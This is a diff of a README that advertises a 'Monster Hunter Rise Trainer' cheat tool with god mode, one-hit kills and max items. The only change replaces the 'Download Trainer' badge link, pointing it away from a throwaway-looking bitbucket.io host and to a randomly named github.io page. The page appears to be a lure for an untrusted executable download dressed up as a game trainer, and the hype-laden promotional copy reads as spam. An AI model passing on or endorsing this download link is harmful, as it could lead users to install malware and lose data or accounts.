@@ -6,7 +6,7 @@ Monster Hunter Rise Trainer 🎮 One-Hit Kill, Max Items, God Mode & Skill Coold
 
 Whether you’re new to **Monster Hunter Rise** or just burned out from endless grinding, the **Monster Hunter Rise Trainer** gives you everything you need to blast through quests, farm instantly, and turn your hunter into a true beast slayer. From **unlimited stamina and health** to **one-click max items, skill cooldown skips, and mega damage boosts**, this trainer saves you hundreds of hours of grind time. 🐲🔥
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload3.bitbucket.io)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://Monster-Hunter-Rise-Trainer-cowi.github.io/.github)
 ---
 
 ## 🎮 What Is a Trainer?
